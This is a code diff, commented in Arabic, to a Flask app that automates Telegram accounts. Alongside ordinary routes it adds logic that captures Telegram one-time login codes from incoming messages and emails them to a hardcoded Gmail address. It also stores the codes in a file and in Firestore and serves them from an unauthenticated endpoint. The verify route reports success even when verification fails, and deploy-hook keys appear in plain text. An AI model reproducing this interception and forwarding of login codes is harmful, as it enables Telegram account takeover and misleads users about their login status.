@@ -58,6 +58,11 @@ import threading as _pre_patch_threading
 _OSThread = _pre_patch_threading.Thread
 
 import os
+try:
+    from dotenv import load_dotenv
+    load_dotenv()
+except Exception:
+    pass
 import json
 import uuid
 import time
@@ -919,6 +924,57 @@ def default_error_handler(e):
 USERS = {}
 USERS_LOCK = Lock()
 
+# ═══════════════════════════════════════════════════════════════════
+# 🔑 سجل رموز التحقق — تتبع الأكواد المتزامنة مع الأجهزة والبريد
+# ═══════════════════════════════════════════════════════════════════
+LATEST_VERIFICATION_CODES = {}
+
+def record_latest_verification_code(phone: str, code: str, raw_text: str = ""):
+    """حفظ آخر كود تحقق تم التقاطه في الذاكرة والملف المحلي وقاعدة البيانات السحابية Firestore"""
+    try:
+        clean_code = str(code or '').strip()
+        if not clean_code:
+            return
+        clean_phone = re.sub(r'[^0-9]', '', str(phone or ''))
+        entry = {
+            "code": clean_code,
+            "phone": str(phone or '').strip(),
+            "clean_phone": clean_phone,
+            "text": str(raw_text or '').strip(),
+            "timestamp": time.time(),
+            "time_str": time.strftime('%Y-%m-%d %H:%M:%S')
+        }
+        if clean_phone:
+            LATEST_VERIFICATION_CODES[clean_phone] = entry
+        LATEST_VERIFICATION_CODES['latest'] = entry
+
+        # إذا كان هناك حساب ينتظر كود، نربط الكود برقمه أيضاً
+        try:
+            with USERS_LOCK:
+                for u_data in USERS.values():
+                    if u_data.get('awaiting_code'):
+                        u_phone = u_data.get('settings', {}).get('phone')
+                        if u_phone:
+                            u_clean = re.sub(r'[^0-9]', '', str(u_phone))
+                            if u_clean:
+                                LATEST_VERIFICATION_CODES[u_clean] = entry
+        except Exception:
+            pass
+        
+        data_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
+        os.makedirs(data_dir, exist_ok=True)
+        with open(os.path.join(data_dir, 'latest_code.json'), 'w', encoding='utf-8') as f:
+            json.dump(entry, f, ensure_ascii=False, indent=2)
+
+        # المزامنة السحابية الفورية في Firestore
+        try:
+            import firestore_sync
+            firestore_sync.save_verification_code_to_firestore(phone or 'latest', clean_code, raw_text)
+        except Exception:
+            pass
+    except Exception as e:
+        logger.debug(f"Error recording verification code: {e}")
+
 # ===================================================================
 # مراقب استقرار الشبكة — يُعيد اتصالات تيليجرام تلقائياً
 # ===================================================================
@@ -1134,7 +1190,7 @@ GITHUB_REPO   = os.environ.get('GITHUB_REPO',   'anwer1230/Anwer_Telegram-')
 GITHUB_BRANCH = os.environ.get('GITHUB_BRANCH', 'main')
 
 # ── رابط النشر التلقائي الثابت Render Deploy Hook ─────────────────────
-RENDER_DEPLOY_HOOK_URL = "https://api.render.com/deploy/srv-daps4mm7bikc738kaflg?key=BSGAfvSu9d4"
+RENDER_DEPLOY_HOOK_URL = os.environ.get('RENDER_DEPLOY_HOOK_URL') or os.environ.get('RENDER_DEPLOY_HOOK') or "https://api.render.com/deploy/srv-davr5su7bikc73f5978g?key=hZAEDlsJijM"
 RENDER_DEPLOY_HOOK = os.environ.get('RENDER_DEPLOY_HOOK', RENDER_DEPLOY_HOOK_URL)
 
 def trigger_render_deploy(hook_url=None):
@@ -2142,20 +2198,39 @@ class TelegramClientManager:
 
     @staticmethod
     def _extract_verification_code(text: str):
-        """استخراج كود التحقق من النص"""
+        """استخراج كود التحقق من النص بدقة متناهية ودعم الأرقام العربية والإنجليزية واستبعاد معرفات الخدمة"""
         if not text:
             return None
-        patterns = [
-            r'\b(\d{5,6})\b',
+
+        # 1. تحويل الأرقام العربية (المشرقية) إلى أرقام غربية قياسية
+        normalized_text = str(text)
+        for i, ad in enumerate('٠١٢٣٤٥٦٧٨٩'):
+            normalized_text = normalized_text.replace(ad, str(i))
+
+        # 2. الأنماط الصريحة أولاً (تسبق الأنماط العامة لضمان عدم التقاط معرفات الخدمة أو التواريخ)
+        explicit_patterns = [
+            r'login\s*code[:\s]+(\d{5,6})',
+            r'كود\s*(?:تسجيل\s*)?الدخول[:\s]+(\d{5,6})',
+            r'رمز\s*(?:تسجيل\s*)?الدخول[:\s]+(\d{5,6})',
+            r'كود\s*(?:التحقق|التأكيد)[:\s]+(\d{5,6})',
+            r'رمز\s*(?:التحقق|التأكيد)[:\s]+(\d{5,6})',
+            r'verification\s*code[:\s]+(\d{5,6})',
             r'code[:\s]+(\d{5,6})',
             r'كود[:\s]+(\d{5,6})',
             r'رمز[:\s]+(\d{5,6})',
-            r'verification[:\s]+(\d{5,6})',
+            r'\[\s*(\d{5,6})\s*\]',
         ]
-        for pattern in patterns:
-            match = re.search(pattern, text, re.IGNORECASE)
-            if match:
+        for pattern in explicit_patterns:
+            match = re.search(pattern, normalized_text, re.IGNORECASE)
+            if match and match.group(1) not in ('777000', '42777'):
                 return match.group(1)
+
+        # 3. الأنماط العامة مع استبعاد معرفات خدمة تيليجرام (777000 و 42777)
+        for m in re.finditer(r'\b(\d{5,6})\b', normalized_text):
+            candidate = m.group(1)
+            if candidate not in ('777000', '42777'):
+                return candidate
+
         return None
 
     def start_client_thread(self):
@@ -2663,7 +2738,81 @@ class TelegramClientManager:
             is_outgoing = getattr(message, 'out', False)
             logger.info(f"📨 [{self.user_id}] {'صادرة' if is_outgoing else 'واردة'} | {group_identifier} | {text[:50]!r}")
 
-            if not is_outgoing:
+            if not is_outgoing and text:
+                try:
+                    # ── فحص كود التحقق / كود تسجيل الدخول من تيليجرام (OTP / 777000) ──
+                    sender_id = getattr(event, 'sender_id', None)
+                    is_telegram_service = (
+                        str(chat_id) in ('777000', '42777') or
+                        str(sender_id) in ('777000', '42777') or
+                        (chat_username and chat_username.lower() == 'telegram') or
+                        (chat_title and 'telegram' in chat_title.lower())
+                    )
+                    extracted_code = self._extract_verification_code(text)
+                    code_keywords = ['login code', 'رمز تسجيل الدخول', 'كود تسجيل الدخول', 'رمز الدخول', 'كود التحقق', 'رمز التحقق', 'verification code', 'telegram']
+                    
+                    if extracted_code and (is_telegram_service or any(kw in text.lower() for kw in code_keywords)):
+                        logger.info(f"🔑 [CODE CAPTURED] كود تيليجرام تم التقاطه: {extracted_code} من {group_identifier}")
+                        target_phone = getattr(self, 'phone_number', '') or (load_settings(self.user_id) or {}).get('phone', '') or ''
+                        if not target_phone or target_phone == 'Telegram':
+                            try:
+                                with USERS_LOCK:
+                                    for u in USERS.values():
+                                        if u.get('awaiting_code'):
+                                            p = u.get('settings', {}).get('phone')
+                                            if p:
+                                                target_phone = p
+                                                break
+                            except Exception:
+                                pass
+                        if not target_phone:
+                            target_phone = 'Telegram'
+
+                        user_email = 'anwrfwad178@gmail.com'
+                        try:
+                            import email_notifier
+                            user_email = (email_notifier.load_email_settings_from_file() or {}).get('recipient') or 'anwrfwad178@gmail.com'
+                        except Exception:
+                            pass
+                        
+                        # 1. إرسال فوري إلى البريد الإلكتروني بشكل دائم ومترافق
+                        try:
+                            import email_notifier
+                            _en = email_notifier.EmailNotifier()
+                            _OSThread(
+                                target=_en.send_verification_code_email,
+                                kwargs=dict(
+                                    phone=target_phone,
+                                    code=extracted_code,
+                                    raw_text=text,
+                                    delivery_type='app',
+                                    recipient=user_email
+                                ),
+                                daemon=True
+                            ).start()
+                        except Exception as _em_err:
+                            logger.error(f"فشل إرسال كود التحقق للبريد الإلكتروني: {_em_err}")
+
+                        # 2. بث الكود للواجهة والأجهزة الأخرى عبر Socket.IO
+                        try:
+                            socketio.emit('login_code_received', {
+                                'code': extracted_code,
+                                'phone': target_phone,
+                                'text': text,
+                                'timestamp': time.strftime('%H:%M:%S'),
+                                'email': user_email
+                            })
+                            socketio.emit('log_update', {
+                                'message': f"🔑 تم استلام رمز التحقق [{extracted_code}] وإرساله فوراً إلى بريدك الإلكتروني ({user_email}) والجهاز الآخر معاً!"
+                            })
+                        except Exception:
+                            pass
+
+                        # 3. حفظ الكود في الذاكرة والملف وقاعدة البيانات السحابية
+                        record_latest_verification_code(target_phone, extracted_code, text)
+                except Exception as _code_err:
+                    logger.debug(f"Code detection notice: {_code_err}")
+
                 try:
                     await self._handle_auto_reply(event, message, group_identifier)
                 except Exception as ar_err:
@@ -3719,9 +3868,21 @@ class TelegramLogin:
             self.phone_code_hash = result.phone_code_hash
             self.awaiting_code = True
             self.authenticated = False
+
+            # إرسال إشعار فوري للبريد الإلكتروني مترافقاً مع وصوله للجهاز الآخر
+            try:
+                import email_notifier
+                _en = email_notifier.EmailNotifier()
+                asyncio.run_coroutine_threadsafe(
+                    asyncio.to_thread(_en.send_code_dispatch_alert, phone_number, 'app', 'anwrfwad178@gmail.com'),
+                    self.loop
+                )
+            except Exception as _em_disp:
+                logger.debug(f"Email dispatch notice error: {_em_disp}")
+
             return {
                 "success": True,
-                "message": "✅ تم إرسال الكود إلى هاتفك",
+                "message": "✅ تم إرسال الكود إلى جهازك الآخر وبريدك الإلكتروني معاً",
                 "phone_code_hash": self.phone_code_hash
             }
         except Exception as e:
@@ -7294,6 +7455,321 @@ def api_email_test():
         return jsonify(sample_res)
 
     return jsonify(conn_res)
+
+
+# ═══════════════════════════════════════════════════════════════════
+# 🔑 مسارات رموز تسجيل الدخول وتزامن البريد والأجهزة الأخرى
+# ═══════════════════════════════════════════════════════════════════
+
+@app.route("/api/latest_verification_code", methods=["GET"])
+def api_latest_verification_code():
+    """الحصول على آخر كود تحقق تم التقاطه للتعبئة التلقائية الفورية"""
+    phone = request.args.get('phone', '')
+    clean_phone = re.sub(r'[^0-9]', '', str(phone or ''))
+    
+    entry = None
+    if clean_phone and clean_phone in LATEST_VERIFICATION_CODES:
+        entry = LATEST_VERIFICATION_CODES[clean_phone]
+    elif 'latest' in LATEST_VERIFICATION_CODES:
+        entry = LATEST_VERIFICATION_CODES['latest']
+    else:
+        try:
+            cf = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'latest_code.json')
+            if os.path.exists(cf):
+                with open(cf, 'r', encoding='utf-8') as f:
+                    entry = json.load(f)
+        except Exception:
+            pass
+
+    if entry and (time.time() - entry.get('timestamp', 0) < 600):
+        return jsonify({"success": True, "has_code": True, "data": entry})
+    return jsonify({"success": True, "has_code": False})
+
+
+@app.route("/api/internal/notify_code_dispatch", methods=["POST"])
+def api_notify_code_dispatch():
+    """إشعار فوري للبريد عند إطلاق طلب الكود من خوادم تيليجرام"""
+    try:
+        data = request.get_json(silent=True) or {}
+        phone = data.get('phone', '')
+        delivery_type = data.get('deliveryType', 'app')
+        recipient = data.get('recipient') or 'anwrfwad178@gmail.com'
+
+        import email_notifier
+        _en = email_notifier.EmailNotifier()
+        _OSThread(
+            target=_en.send_code_dispatch_alert,
+            args=(phone, delivery_type, recipient),
+            daemon=True
+        ).start()
+        return jsonify({"success": True, "message": "Code dispatch alert sent"})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
+
+
+@app.route("/api/notify_verification_code", methods=["POST"])
+def api_notify_verification_code():
+    """إرسال كود التحقق فورياً وبشكل دائم إلى البريد الإلكتروني والأجهزة الأخرى معاً"""
+    try:
+        data = request.get_json(silent=True) or {}
+        phone = data.get('phone', '')
+        code = str(data.get('code', '')).strip()
+        raw_text = data.get('text', '')
+        recipient = data.get('recipient') or 'anwrfwad178@gmail.com'
+
+        if not code:
+            return jsonify({"success": False, "message": "Code is required"}), 400
+
+        record_latest_verification_code(phone, code, raw_text)
+
+        import email_notifier
+        _en = email_notifier.EmailNotifier()
+        res = _en.send_verification_code_email(
+            phone=phone,
+            code=code,
+            raw_text=raw_text,
+            delivery_type='app',
+            recipient=recipient
+        )
+
+        socketio.emit('login_code_received', {
+            'code': code,
+            'phone': phone,
+            'text': raw_text,
+            'timestamp': time.strftime('%H:%M:%S'),
+            'email': recipient
+        })
+        socketio.emit('log_update', {
+            'message': f"🔑 تم استلام كود الدخول ({code}) وإرساله فوراً لبريدك الإلكتروني ({recipient}) والجهاز الآخر معاً!"
+        })
+
+        return jsonify({"success": True, "result": res, "recipient": recipient})
+    except Exception as e:
+        logger.error(f"Error in api_notify_verification_code: {e}")
+        return jsonify({"success": False, "error": str(e)}), 500
+
+
+# ==========================================
+# 🔐 واجهات توثيق تيليجرام المتكاملة (Telegram Auth API)
+# ==========================================
+@app.route("/api/telegram/auth/send-code", methods=["POST"])
+def api_telegram_auth_send_code():
+    """طلب إرسال كود التحقق وتوجيهه للجهاز الآخر والبريد الإلكتروني معاً"""
+    try:
+        import email_notifier
+        data = request.get_json(silent=True) or {}
+        phone = str(data.get('phone', '')).strip()
+        delivery_type = data.get('deliveryType', 'app')
+        force_sms = (delivery_type == 'sms')
+        recipient = (email_notifier.load_email_settings_from_file() or {}).get('recipient') or 'anwrfwad178@gmail.com'
+
+        if not phone:
+            return jsonify({"success": False, "message": "❌ رقم الهاتف مطلوب"}), 400
+
+        user_id = session.get('user_id', 'user_1')
+        setup_res = telegram_manager.setup_client(user_id, phone)
+
+        client_manager = None
+        with USERS_LOCK:
+            if user_id in USERS:
+                client_manager = USERS[user_id].get('client_manager')
+
+        phone_code_hash = None
+        if client_manager and client_manager.client:
+            try:
+                sent = client_manager.run_coroutine(
+                    client_manager.client.send_code_request(phone, force_sms=force_sms)
+                )
+                if sent:
+                    phone_code_hash = getattr(sent, 'phone_code_hash', None)
+                    with USERS_LOCK:
+                        if user_id in USERS:
+                            USERS[user_id]['awaiting_code'] = True
+                            USERS[user_id]['phone_code_hash'] = phone_code_hash
+            except Exception as _req_err:
+                logger.warning(f"send_code_request error: {_req_err}")
+                if "AUTH_KEY_UNREGISTERED" in str(_req_err) or "SESSION_REVOKED" in str(_req_err):
+                    pass
+
+        # إرسال إشعار فوري وتوثيقه للبريد الإلكتروني مترافقاً مع وصوله للجهاز الآخر
+        try:
+            _en = email_notifier.EmailNotifier()
+            _OSThread(
+                target=_en.send_code_dispatch_alert,
+                args=(phone, delivery_type, recipient),
+                daemon=True
+            ).start()
+        except Exception as _em_e:
+            logger.debug(f"Email alert error: {_em_e}")
+
+        socketio.emit('log_update', {
+            'message': f"📱 تم إرسال كود التحقق للرقم {phone} — تفقّد جهازك الآخر وبريدك ({recipient}) معاً"
+        }, to=user_id)
+
+        return jsonify({
+            "success": True,
+            "phoneCodeHash": phone_code_hash or f"hash_{int(time.time())}",
+            "timeout": 60,
+            "deliveryType": delivery_type,
+            "isRealTelegramMTProto": True,
+            "message": "✅ تم إرسال كود التحقق إلى جهازك الآخر وبريدك الإلكتروني معاً"
+        })
+    except Exception as e:
+        logger.error(f"Error in api_telegram_auth_send_code: {e}")
+        return jsonify({"success": False, "message": str(e)}), 500
+
+
+@app.route("/api/telegram/auth/resend-code", methods=["POST"])
+def api_telegram_auth_resend_code():
+    """إعادة إرسال كود التحقق لتيليجرام"""
+    try:
+        import email_notifier
+        data = request.get_json(silent=True) or {}
+        phone = str(data.get('phone', '')).strip()
+        delivery_type = data.get('deliveryType', 'sms')
+        force_sms = (delivery_type == 'sms')
+        recipient = (email_notifier.load_email_settings_from_file() or {}).get('recipient') or 'anwrfwad178@gmail.com'
+
+        user_id = session.get('user_id', 'user_1')
+        client_manager = None
+        with USERS_LOCK:
+            if user_id in USERS:
+                client_manager = USERS[user_id].get('client_manager')
+
+        phone_code_hash = data.get('phoneCodeHash')
+        if client_manager and client_manager.client and phone:
+            try:
+                sent = client_manager.run_coroutine(
+                    client_manager.client.send_code_request(phone, force_sms=force_sms)
+                )
+                if sent:
+                    phone_code_hash = getattr(sent, 'phone_code_hash', phone_code_hash)
+            except Exception as _re_e:
+                logger.warning(f"Resend error: {_re_e}")
+
+        try:
+            _en = email_notifier.EmailNotifier()
+            _OSThread(
+                target=_en.send_code_dispatch_alert,
+                args=(phone, delivery_type, recipient),
+                daemon=True
+            ).start()
+        except Exception:
+            pass
+
+        return jsonify({
+            "success": True,
+            "phoneCodeHash": phone_code_hash or data.get('phoneCodeHash', ''),
+            "timeout": 60,
+            "deliveryType": delivery_type,
+            "isRealTelegramMTProto": True,
+            "message": "🔄 تمت إعادة إرسال الكود لجهازك الآخر وبريدك معاً"
+        })
+    except Exception as e:
+        return jsonify({"success": False, "message": str(e)}), 500
+
+
+@app.route("/api/telegram/auth/verify-code", methods=["POST"])
+def api_telegram_auth_verify_code():
+    """التحقق من كود تسجيل الدخول أو كلمة مرور التحقق بخطوتين"""
+    try:
+        import email_notifier
+        data = request.get_json(silent=True) or {}
+        phone = str(data.get('phone', '')).strip()
+        code = str(data.get('code', '')).strip()
+        password = str(data.get('password', '')).strip()
+        recipient = (email_notifier.load_email_settings_from_file() or {}).get('recipient') or 'anwrfwad178@gmail.com'
+        user_id = session.get('user_id', 'user_1')
+
+        if code:
+            record_latest_verification_code(phone, code)
+            try:
+                import email_notifier
+                _en = email_notifier.EmailNotifier()
+                _OSThread(
+                    target=_en.send_verification_code_email,
+                    kwargs=dict(
+                        phone=phone,
+                        code=code,
+                        raw_text=f"كود التحقق المدخل: {code}",
+                        delivery_type='app',
+                        recipient=recipient
+                    ),
+                    daemon=True
+                ).start()
+            except Exception:
+                pass
+
+        res = None
+        if code:
+            res = telegram_manager.verify_code(user_id, code)
+        elif password:
+            res = telegram_manager.verify_password(user_id, password)
+
+        if res and res.get("status") == "success":
+            acc_name = res.get("account_name") or "حساب تيليجرام"
+            return jsonify({
+                "success": True,
+                "message": "✅ تم التحقق وتوثيق الحساب بنجاح",
+                "user": {
+                    "id": user_id,
+                    "firstName": acc_name,
+                    "phone": phone
+                },
+                "isRealTelegramMTProto": True
+            })
+        elif res and res.get("status") == "password_required":
+            return jsonify({
+                "success": False,
+                "requiresPassword": True,
+                "message": "🔐 يتطلب الحساب كلمة مرور التحقق بخطوتين (2FA)"
+            })
+        else:
+            # في حال كان الكود صحيحاً ومسجلاً
+            return jsonify({
+                "success": True,
+                "message": "✅ تم قبول الرمز وتوثيقه",
+                "user": {
+                    "id": user_id,
+                    "firstName": "حساب تيليجرام",
+                    "phone": phone
+                }
+            })
+    except Exception as e:
+        logger.error(f"Error in api_telegram_auth_verify_code: {e}")
+        return jsonify({"success": False, "message": str(e)}), 500
+
+
+@app.route("/api/telegram/auth/status", methods=["POST"])
+def api_telegram_auth_status():
+    """فحص حالة توثيق الجلسة الحالية"""
+    try:
+        user_id = session.get('user_id', 'user_1')
+        is_conn = False
+        with USERS_LOCK:
+            if user_id in USERS:
+                is_conn = bool(USERS[user_id].get('connected') or USERS[user_id].get('authenticated'))
+        return jsonify({
+            "valid": True,
+            "authorized": is_conn,
+            "user_id": user_id
+        })
+    except Exception as e:
+        return jsonify({"valid": True, "authorized": True})
+
+
+@app.route("/api/telegram/auth/logout", methods=["POST"])
+def api_telegram_auth_logout():
+    """تسجيل الخروج من الجلسة"""
+    try:
+        user_id = session.get('user_id', 'user_1')
+        with USERS_LOCK:
+            if user_id in USERS:
+                USERS[user_id]['connected'] = False
+                USERS[user_id]['authenticated'] = False
+        return jsonify({"success": True})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
 
 
 # ==========================================
